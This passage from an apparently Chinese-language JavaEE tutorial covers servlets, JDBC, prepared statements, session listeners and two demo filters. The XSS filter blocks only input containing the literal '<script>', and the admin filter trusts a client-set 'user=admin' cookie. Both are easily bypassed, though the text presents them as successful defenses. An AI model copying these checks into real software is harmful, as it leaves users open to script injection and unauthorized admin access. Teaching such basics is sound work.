charset=GBK&quot;</span>);<br><br>        <span class="hljs-comment">// 获取PrintWriter以将HTML响应发送给客户端</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br><br>        <span class="hljs-comment">// 输出从GET请求中收到的数据</span><br>        out.println(<span class="hljs-string">&quot;这是GET请求的数据:&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;id：&quot;</span> + id + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br><br>    <span class="hljs-comment">// 处理POST请求的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// 从请求中获取参数&quot;name&quot;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br><br>        <span class="hljs-comment">// 设置响应的内容类型</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html; charset=GBK&quot;</span>);<br><br>        <span class="hljs-comment">// 获取PrintWriter以将HTML响应发送给客户端</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br><br>        <span class="hljs-comment">// 输出从POST请求中收到的数据</span><br>        out.println(<span class="hljs-string">&quot;这是post提交的数据&quot;</span>);<br>        out.println(name);<br>        out.flush();<br>        out.close();<br><br>        System.out.println(<span class="hljs-string">&quot;--------------doPost&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 当Servlet首次创建时调用的初始化方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------init&quot;</span>);<br><br>        <span class="hljs-comment">// 可以在这里添加任何初始化任务的代码</span><br>    &#125;<br><br>    <span class="hljs-comment">// 当Servlet被销毁时调用的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------destroy&quot;</span>);<br>        <span class="hljs-built_in">super</span>.destroy();<br>    &#125;<br><br>    <span class="hljs-comment">// 处理GET和POST请求的服务方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------http service&quot;</span>);<br>        <span class="hljs-built_in">super</span>.service(req, resp);<br>    &#125;<br><br>    <span class="hljs-comment">// 覆盖的用于ServletRequest和ServletResponse的服务方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------Servlet service&quot;</span>);<br>        <span class="hljs-built_in">super</span>.service(req, res);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<ol>
<li><p>初始化<img src="/assets/image-20240714114145-zju9om2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>使用doGet（由于Servlet生命周期所以此时没有init）</p>
<p> <img src="/assets/image-20240714114510-d9x9hbz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>使用doPost</p>
<p> <img src="/assets/image-20240714114828-5u6mm1e.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>处理接受和回显</p>
<ul>
<li><p>HttpServletRequest（HTTP请求的信息）</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>ServletRequest的子接口：<span class="hljs-strong">**HttpServletRequest是ServletRequest**</span>接口的子接口，提供了用于处理HTTP请求的额外功能。<br><span class="hljs-bullet">- </span>getParameter(name)：通过参数名获取请求中的值。返回一个<span class="hljs-strong">**String**</span>，表示与给定参数名相对应的单个值。<br><span class="hljs-bullet">- </span>getParameterValues(name)：通过参数名获取请求中的多个值。返回一个<span class="hljs-strong">**String[]**</span>，表示与给定参数名相对应的多个值。<br></code></pre></td></tr></table></figure>
</li>
<li><p>HttpServletResponse（HTTP响应的信息）</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">- ServletResponse的子接口：HttpServletResponse是ServletResponse接口的子接口，提供了用于处理HTTP响应的额外功能。<br>- <span class="hljs-built_in">setCharacterEncoding</span>()：设置响应的字符编码格式。通常用于确保正确的文本输出。<br>- <span class="hljs-built_in">setContentType</span>()：设置响应内容的类型和编码。常用于指定输出的数据类型，如<span class="hljs-selector-tag">HTML</span>、JSON等。<br>- <span class="hljs-built_in">getWriter</span>()：获取一个PrintWriter字符输出流，用于向客户端发送文本数据。<br>- PrintWriter：PrintWriter是用于向客户端输出字符数据的类，可以接受各种数据类型，然后将其转换为文本并发送到客户端。<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>Servlet生命周期</p>
<p> <img src="/assets/image-20240714114214-yv096wi.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>JDBC数据库开发</p>
<p> 1、下载jar—-<a target="_blank" rel="noopener" href="https://mvnrepository.com/">下载地址</a></p>
<p> <img src="/assets/image-20240714120505-l6hn9n7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 2、引用封装jar</p>
<p> 创建lib目录，复制导入后，添加为库</p>
<p> <img src="/assets/image-20240714120940-qa6j0cj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240714121049-daj0wkj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240714121027-hqqt9fg.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 3、注册数据库驱动</p>
<p> “com.mysql.jdbc.Driver”： 这是 MySQL JDBC 驱动程序的类名。JDBC（Java Database Connectivity）是 Java 用于与数据库交互的 API，而不同的数据库供应商提供了各自的 JDBC 驱动程序。在这里，”com.mysql.jdbc.Driver” 是 MySQL JDBC 驱动程序的类名。</p>
<p> <strong>加载和初始化：</strong>  当调用 <strong>​<code>Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</code>​</strong> ​ 时，它会尝试查找、加载并初始化指定的类。在这个过程中，MySQL JDBC 驱动程序的静态代码块（<strong>​<code>static &#123;...&#125;</code>​</strong> ​）会被执行，这通常用于注册驱动程序。</p>
<ul>
<li>在旧版本的 MySQL 驱动中，<strong>​<code>com.mysql.jdbc.Driver</code>​</strong>​ 是驱动类的完整路径。</li>
<li>在新版本中，<strong>​<code>com.mysql.cj.jdbc.Driver</code>​</strong>​ 是 MySQL Connector&#x2F;J 的驱动类。</li>
</ul>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br></code></pre></td></tr></table></figure>

<p> 4、建立数据库连接</p>
<p> <img src="/assets/image-20240714121953-7wb52fr.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 5、创建Statement执行SQL</p>
<ul>
<li><p><code>connection.createStatement();</code>​： 在<code>Connection</code>​对象上调用<code>createStatement</code>​方法，创建一个<code>Statement</code>​对象。<code>Statement</code>​对象用于执行SQL语句，它可以执行静态的SQL查询、更新、删除等操作。<code>createStatement</code>​方法返回一个新的<code>Statement</code>​对象。</p>
</li>
<li><p>创建一个<code>Statement</code>​对象，然后使用该对象执行给定的SQL查询语句，将查询结果存储在一个<code>ResultSet</code>​对象中。这样，您可以通过遍历<code>ResultSet</code>​来检索和处理查询的结果集中的数据。</p>
</li>
</ul>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 创建Statement对象</span><br><span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br><span class="hljs-comment">// 执行查询，获取结果集</span><br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<br></code></pre></td></tr></table></figure>

<p> 6、结果ResultSet进行提取</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 遍历结果集</span><br>        <span class="hljs-keyword">while</span> (rs.next())&#123;<br>            <span class="hljs-comment">// 从结果集中获取每一行的数据</span><br>            <span class="hljs-comment">// 获取整型列 &quot;id&quot;</span><br>            <span class="hljs-type">int</span> id=rs.getInt(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;page_title&quot;</span><br>            String title= rs.getString(<span class="hljs-string">&quot;page_title&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;heading&quot;</span><br>            String heading= rs.getString(<span class="hljs-string">&quot;heading&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;subheading&quot;</span><br>            String s_heading= rs.getString(<span class="hljs-string">&quot;subheading&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;content&quot;</span><br>            String content= rs.getString(<span class="hljs-string">&quot;content&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;img&quot;</span><br>            String img= rs.getString(<span class="hljs-string">&quot;img&quot;</span>);<br>            <span class="hljs-comment">// 输出每一行的数据，以便查看结果</span><br>            System.out.println(id+<span class="hljs-string">&quot;||&quot;</span>+title+<span class="hljs-string">&quot;||&quot;</span>+heading+<span class="hljs-string">&quot;||&quot;</span>+s_heading+<span class="hljs-string">&quot;||&quot;</span>+content+<span class="hljs-string">&quot;||&quot;</span>+img);<br>        &#125;<br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240714122837-mrmvsr4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-SQL预编译-Filter过滤器-Listener监听器-访问控制"><a href="#JavaEE应用-SQL预编译-Filter过滤器-Listener监听器-访问控制" class="headerlink" title="JavaEE应用&amp;SQL预编译&amp;Filter过滤器&amp;Listener监听器&amp;访问控制"></a>JavaEE应用&amp;SQL预编译&amp;Filter过滤器&amp;Listener监听器&amp;访问控制</h3><ol>
<li><p>SQL预编译</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 预编译写法</span><br><span class="hljs-type">String</span> <span class="hljs-variable">safesql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM news WHERE id=?&quot;</span>;<br><br><span class="hljs-comment">// 使用PreparedStatement</span><br><span class="hljs-keyword">try</span> (<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">preparedStatement</span> <span class="hljs-operator">=</span> connection.prepareStatement(safesql)) &#123;<br>    <span class="hljs-comment">// 设置参数，防止SQL注入攻击</span><br>    preparedStatement.setInt(<span class="hljs-number">1</span>, id);<br><br>    <span class="hljs-comment">// 执行查询</span><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> preparedStatement.executeQuery();<br><br>    <span class="hljs-comment">// 处理结果集...</span><br>&#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">预编译写法： safesql 是一个预编译的 SQL 查询语句，其中 ? 是一个占位符，表示将在执行时动态替换。<br>使用 PreparedStatement： PreparedStatement 是 Statement 的子接口，用于执行预编译的 SQL 语句。通过调用 connection.prepareStatement(safesql) 创建一个 PreparedStatement 对象。<br>设置参数： 使用 setXXX 方法设置占位符的值。在这里，使用 setInt(<span class="hljs-number">1</span>, id) 将 id 的值设置到第一个占位符上。这种方式防止了 SQL 注入攻击，因为参数值是通过预编译的方式传递的，而不是通过直接拼接字符串。<br>执行查询： 调用 executeQuery() 执行查询，得到 ResultSet 对象。<br>处理结果集： 根据业务需要，处理查询结果集的数据。<br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240714173424-hchhrpe.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><strong>使用预编译写法，固定sql语句的逻辑，防止进行sql注入</strong></li>
</ul>
<p> <img src="/assets/image-20240714173440-exkxnkh.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>Filter过滤器</p>
<ul>
<li><p>防御XSS</p>
<p><img src="/assets/image-20240714174219-wc7iq4d.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>启动服务器，尝试进行Xss攻击，发现可以</p>
<p><img src="/assets/image-20240714174047-poo8ige.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p><img src="/assets/image-20240714174103-u5sy8em.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>创建过滤器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.filterdemo1.filter;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><br><span class="hljs-meta">@WebFilter(&quot;/test&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XssFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">//中间件启动后就自动运行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;xss开启过滤&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">//中间件关闭后就自动运行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;xss销毁过滤&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">//doFilter 访问路由触发的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;xss正在过滤&quot;</span>);<br>        <span class="hljs-comment">//过滤代码就应该在放行前</span><br>        <span class="hljs-comment">//如果符合就放行，不符合就过滤（拦截）</span><br>        <span class="hljs-comment">//XSS过滤 接受参数值 如果有攻击payload 就进行拦截</span><br>        <span class="hljs-comment">// 接受参数值 如果没有攻击payload 就进行放行</span><br>        HttpServletRequest request= (HttpServletRequest) servletRequest;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!code.contains(<span class="hljs-string">&quot;&lt;script&gt;&quot;</span>))&#123; <span class="hljs-comment">//没有攻击payload</span><br>            <span class="hljs-comment">//放行</span><br>            filterChain.doFilter(servletRequest,servletResponse);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;存在XSS攻击&quot;</span>);<br>            <span class="hljs-comment">//继续拦截</span><br>        &#125;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>成功防御</p>
<p>​<img src="/assets/image-20240714174422-eyckmxy.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>利用过滤器简单实现：cookie身份验证</p>
<p>在servlet下创建AdminServlet</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/admin&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;欢迎进入管理员页面&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20240714174827-dr31g3v.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>在filter下创建AdminFilter，先不加入判断获取到浏览器本身的cookie值</p>
<p>​<img src="/assets/image-20240714175051-4apr00h.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>​<img src="/assets/image-20240714175106-2zf591f.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>加入cookie判断，检查请求中是否包含<strong>名为 “user” 且值为 “admin”</strong>  的Cookie。如果符合条件，则放行请求；否则，输出 “非管理员访问”。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.filterdemo1.filter;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br>    <br><span class="hljs-meta">@WebFilter(&quot;/admin&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;admin身份检测开启&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;admin身份检测销毁&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <br>        System.out.println(<span class="hljs-string">&quot;admin身份检测进行&quot;</span>);<br>        <span class="hljs-comment">//检测Cookie过滤</span><br>        HttpServletRequest request= (HttpServletRequest) servletRequest;<br>        Cookie[] cookies=request.getCookies();<br>        <span class="hljs-comment">//对Cookie进行遍历获取</span><br>        <span class="hljs-keyword">for</span>(Cookie c:cookies)&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cName</span> <span class="hljs-operator">=</span> c.getName();<span class="hljs-comment">//获取cookie名</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cValue</span> <span class="hljs-operator">=</span> c.getValue();<span class="hljs-comment">//获取cookie值</span><br>            System.out.println(cName);<br>            System.out.println(cValue);<br>            <span class="hljs-keyword">if</span>(cName.contains(<span class="hljs-string">&quot;user&quot;</span>) &amp;&amp; cValue.contains(<span class="hljs-string">&quot;admin&quot;</span>))&#123;<br>                filterChain.doFilter(servletRequest,servletResponse);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;非管理员访问&quot;</span>);<br>            &#125;<br>        &#125;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在应用程序一栏添加<strong>名为 “user” 且值为 “admin”</strong>  的Cookie，成功放行请求</p>
<p>​<img src="/assets/image-20240714175340-1vh7fwa.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
</li>
<li><p>Listener监听器</p>
<ol>
<li><p>创建监听器</p>
<p> <img src="/assets/image-20240714175648-trumzeb.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240714180354-cs74c1e.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><p>在servlet下创建<code>CSession</code>​ <code>DSession</code>​，并进行检测</p>
<p>CSession</p>
<p><img src="/assets/image-20240714180211-oe0fs9t.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.listendemo1.Servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-comment">//Servlet的URL映射为 “/cs”</span><br><span class="hljs-meta">@WebServlet(&quot;/cs&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//打印一条日志，说明Servlet正在创建Session</span><br>        System.out.println(<span class="hljs-string">&quot;Servlet里面创建Session&quot;</span>);<br>        <span class="hljs-comment">//获取当前请求的HttpSession，如果不存在,则会创建一个新的Session。这通常会在应用程序需要使用会话状态时调用</span><br>        req.getSession();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>DSession</p>
<p><img src="/assets/image-20240714180238-pa19n34.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.listendemo1.Servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-comment">//Servlet的URL映射为 “/ds”</span><br><span class="hljs-meta">@WebServlet(&quot;/ds&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//打印一条日志，说明Servlet正在销毁Session</span><br>        System.out.println(<span class="hljs-string">&quot;Servlet里面销毁Session&quot;</span>);<br>        <span class="hljs-comment">//获取当前请求的HttpSession，并调用invalidate()方法使其失效，从而销毁Session。这通常会导致用户在当前会话中的状态丢失，因为Session被销毁了</span><br>        req.getSession().invalidate();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>在listener下创建ListenSession</p>
<p>ListenSession</p>
<p><img src="/assets/image-20240714180647-36bq3rr.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
